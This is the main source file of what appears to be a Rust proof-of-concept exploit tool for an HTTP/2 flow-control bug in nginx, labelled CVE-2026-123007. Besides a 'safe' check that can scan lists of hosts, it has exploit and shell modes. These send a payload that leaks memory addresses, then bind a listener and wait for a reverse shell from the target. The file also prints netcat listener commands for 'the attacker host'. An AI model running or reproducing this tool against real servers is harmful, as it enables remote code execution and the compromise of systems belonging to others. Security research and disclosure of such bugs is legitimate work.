#![allow(dead_code)]

mod bootstrap;
mod bulk;
mod cli;
mod h2;
mod leak;
mod limits;
mod profile;
mod reclaim;
mod runner;
mod shell;
mod target;
mod tls;

use std::io::IsTerminal;
use std::time::Duration;

use cli::Mode;
use profile::Profile;

fn main() {
    // macOS has no MSG_NOSIGNAL; ignoring SIGPIPE covers both platforms.
    unsafe {
        libc::signal(libc::SIGPIPE, libc::SIG_IGN);
    }
    let parsed = cli::parse();
    limits::set_stage_timeout(parsed.timeout);
    limits::set_verbose(parsed.args.verbose);
    // --shell must bind first: --lport 0 means "pick one" and the payload has
    // to carry the port that was actually bound.
    let mut args = parsed.args.clone();
    let shell_listener = if parsed.mode == Mode::Shell {
        match shell::Listener::start(args.lport) {
            Ok(listener) => {
                args.lport = listener.port;
                Some(listener)
            }
            Err(error) => fail(
                2,
                &format!(
                    "cannot listen on 0.0.0.0:{}: {error}. Close your nc/socat listener or use another --lport",
                    args.lport
                ),
            ),
        }
    } else {
        None
    };
    let args = &args;
    let (profiles, selected) = match load_profiles(&args.profile) {
        Ok(values) => values,
        Err(error) => fail(2, &format!("{error:#}")),
    };
    // A target list is a --safe convenience: no heap shaping, no long traffic.
    if args.targets.is_some() || !args.hosts.is_empty() {
        if parsed.mode != Mode::Safe {
            fail(2, "--targets/--hosts are only supported with --safe");
        }
        let mut origins = args.hosts.clone();
        if let Some(list) = &args.targets {
            match std::fs::read_to_string(list) {
                Ok(text) => origins.extend(
                    text.lines()
                        .map(|line| line.split('#').next().unwrap_or("").trim().to_string())
                        .filter(|line| !line.is_empty()),
                ),
                Err(error) => fail(2, &format!("cannot read {}: {error}", list.display())),
            }
        }
        let status = run_target_list(&origins, &profiles, &selected, args);
        std::process::exit(status);
    }
    let host = args.host.clone().unwrap_or_default();
    let origin = match target::parse_origin(&host) {
        Ok(origin) => origin,
        Err(error) => fail(2, &format!("{error}")),
    };
    let command = match parsed.mode {
        Mode::Safe => Vec::new(),
        Mode::Exploit | Mode::Shell => match runner::command_for(args, &selected) {
            Ok(command) => command,
            Err(error) => fail(2, &format!("{error:#}")),
        },
    };
    let safe_resource = effective_path(args, &origin);
    let mut config = match target::Config::new(origin, command, profiles, selected) {
        Ok(config) => config,
        Err(error) => fail(2, &format!("{error:#}")),
    };

    match parsed.mode {
        Mode::Safe => {
            println!("[*] target {} mode=safe resource={}", host, safe_resource);
            match runner::run_safe(&mut config, safe_resource.as_bytes()) {
                Ok(report) => {
                    println!("[+] CVE-2026-123007 PROOF: VULNERABLE");
                    println!("    target: {host}   resource: {safe_resource}");
                    println!(
                        "    observed: server={:?} settings={:?} body={} bytes",
                        report.server_header, report.settings, report.body_size
                    );
                    println!(
                        "    [1] queued-DATA refund      : {} ({} streams reset with FLOW_CONTROL_ERROR=3)",
                        if report.target_resets == 2 { "PASS" } else { "FAIL" },
                        report.target_resets
                    );
                    println!(
                        "    [2] public-byte release    : {} ({} bytes returned)",
                        if report.release_bytes == 10 { "PASS" } else { "FAIL" },
                        report.release_bytes
                    );
                    println!(
                        "    [3] underflowed WU guard   : {} (post-refund PING ACK)",
                        if report.ping_ack { "PASS" } else { "FAIL" }
                    );
                    println!(
                        "    [4] connection still usable: {}",
                        if report.connection_open && report.ping_ack { "PASS" } else { "FAIL" }
                    );
                    println!("    no memory corruption, no crash, no shell");
                }
                Err(error) => {
                    println!("[-] NOT PROVEN: {error:#}");
                    std::process::exit(4);
                }
            }
        }
        Mode::Exploit => {
            announce(args, &config, &parsed.timeout);
            let mut confirmed = false;
            match runner::run_exploit(&mut config, &mut confirmed) {
                Ok(result) => {
                    println!(
                        "[+] DISPATCHED (unconfirmed): H={:#x} nginx={:#x} libc={:#x} profile={} plaintext={:.2} GiB auxiliaries={}",
                        result.holder, result.nginx, result.libc, result.profile,
                        result.plaintext_gib, result.auxiliaries
                    );
                    if args.cmd.is_none() {
                        println!(
                            "[*] confirm with: {}{}",
                            listener_hint(args.lport),
                            args.lhost.map(|l| format!("  (payload -> {l})")).unwrap_or_default()
                        );
                    }
                }
                Err(error) => {
                    println!("[-] exploit failed: {error:#}");
                    std::process::exit(if confirmed { 2 } else { 1 });
                }
            }
        }
        Mode::Shell => {
            let listener = shell_listener.expect("shell listener"); 
            println!("[*] listener on 0.0.0.0:{}", listener.port);
            announce(args, &config, &parsed.timeout);
            let mut confirmed = false;
            let result = match runner::run_exploit(&mut config, &mut confirmed) {
                Ok(result) => result,
                Err(error) => {
                    println!("[-] exploit failed: {error:#}");
                    std::process::exit(if confirmed { 2 } else { 1 });
                }
            };
            println!(
                "[*] payload dispatched in profile {} ({:.2} GiB); waiting {}s for the shell",
                result.profile, result.plaintext_gib, args.shell_timeout
            );
            let conn = match listener.accept(runner::verification_timeout(args)) {
                Ok(conn) => conn,
                Err(error) => {
                    println!("[-] DISPATCHED, NO SHELL: {error}");
                    std::process::exit(3);
                }
            };
            match shell::verify(conn, args.interactive, Duration::from_secs(15)) {
                Ok(transcript) => {
                    println!("[+] SHELL OK:\n{transcript}");
                }
                Err(error) => {
                    println!("[-] DISPATCHED, SHELL UNVERIFIED: {error:#}");
                    std::process::exit(3);
                }
            }
        }
    }
}

fn load_profiles(value: &str) -> anyhow::Result<(Vec<Profile>, Profile)> {
    if value == "auto" {
        let profiles = profile::load_builtins()?;
        let selected = profiles
            .iter()
            .find(|profile| profile.name.contains("1.31.8"))
            .cloned()
            .unwrap_or_else(|| profiles[0].clone());
        Ok((profiles, selected))
    } else {
        let selected = profile::load_named(value)?;
        Ok((vec![selected.clone()], selected))
    }
}

/// BSD/macOS `nc` rejects `-p` together with `-l`; Linux accepts it.
fn listener_hint(port: u16) -> String {
    match std::env::consts::OS {
        "macos" | "ios" | "freebsd" | "netbsd" | "openbsd" | "dragonfly" => {
            format!("nc -lv {port}")
        }
        _ => format!("nc -lvnp {port}"),
    }
}

fn announce(args: &cli::Args, config: &target::Config, timeout: &Option<Duration>) {
    println!(
        "[*] target {} mode={} profile={}",
        args.host.clone().unwrap_or_default(),
        if args.shell { "shell" } else { "exploit" },
        config.profile.name
    );
    if let Ok(command) = std::str::from_utf8(&config.command) {
        println!("[*] payload: {command}");
    }
    if args.cmd.is_none() && !args.shell {
        if let Some(lhost) = args.lhost {
            println!(
                "[*] start this on the attacker host first: {}   (callback {lhost})",
                listener_hint(args.lport)
            );
        }
    }
    if args.shell {
        println!(
            "[*] this tool owns the listener on 0.0.0.0:{}; do NOT run nc/socat on that port",
            args.lport
        );
    }
    println!(
        "[*] expected traffic ~119.02 GiB plaintext, 16 auxiliary connections; 2-20 minutes on a good path"
    );
    if !args.yes && std::io::stdin().is_terminal() {
        println!("[*] press Enter to start (or pass --yes)");
        let mut line = String::new();
        let _ = std::io::stdin().read_line(&mut line);
    }
    if let Some(timeout) = timeout {
        println!("[*] stage timeout override: {}s", timeout.as_secs());
    }
}

fn fail(code: i32, message: &str) -> ! {
    eprintln!("poc: {message}");
    std::process::exit(code);
}

/// --path wins; otherwise the path in --host; otherwise the profile default.
fn effective_path(args: &cli::Args, origin: &target::Origin) -> String {
    args.path
        .clone()
        .or_else(|| origin.path.clone())
        .unwrap_or_else(|| "/index.html".to_string())
}

/// `--safe` over a list of origins (file lines or --hosts).
fn run_target_list(
    origins: &[String],
    profiles: &[Profile],
    selected: &Profile,
    args: &cli::Args,
) -> i32 {
    let mut tested = 0usize;
    let mut vulnerable = 0usize;
    for line in origins {
        let line = line.as_str();
        let origin = match target::parse_origin(line) {
            Ok(origin) => origin,
            Err(error) => {
                println!("{line:<42} SKIP ({error})");
                continue;
            }
        };
        let path = effective_path(args, &origin).into_bytes();
        let mut config = match target::Config::new(
            origin,
            Vec::new(),
            profiles.to_vec(),
            selected.clone(),
        ) {
            Ok(config) => config,
            Err(error) => {
                println!("{line:<42} ERROR ({error:#})");
                tested += 1;
                continue;
            }
        };
        tested += 1;
        match runner::run_safe(&mut config, &path) {
            Ok(report) => {
                vulnerable += 1;
                println!(
                    "{line:<42} VULNERABLE  server={:?} body={} bytes resets={} release={} ping={}",
                    report.server_header,
                    report.body_size,
                    report.target_resets,
                    report.release_bytes,
                    report.ping_ack
                );
            }
            Err(error) => println!("{line:<42} NOT PROVEN  {error:#}"),
        }
    }
    println!("\n{tested} tested, {vulnerable} vulnerable");
    if vulnerable > 0 {
        0
    } else {
        4
    }
}
